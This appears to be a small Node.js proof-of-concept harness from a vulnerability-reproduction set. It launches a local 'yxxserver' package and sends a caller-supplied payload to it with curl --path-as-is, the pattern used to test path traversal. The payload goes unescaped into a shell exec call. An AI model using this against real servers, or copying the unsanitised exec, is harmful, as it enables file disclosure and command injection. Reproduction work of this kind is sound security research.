function exploitFunction(payload) {
    const path = require("path");
    const { exec } = require("child_process");

    let server = "node ./node_modules/yxxserver/index.js";
    let exe = exec(server, (error, stdout) => {
        let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
        exec(attack_string, (error, stdout) => {
            return stdout;
        });
    });

    return new Promise((resolve) => {
        setTimeout(() => resolve(exe), 2000); // Wait for the server to start
    });
}

module.exports = { exploitFunction };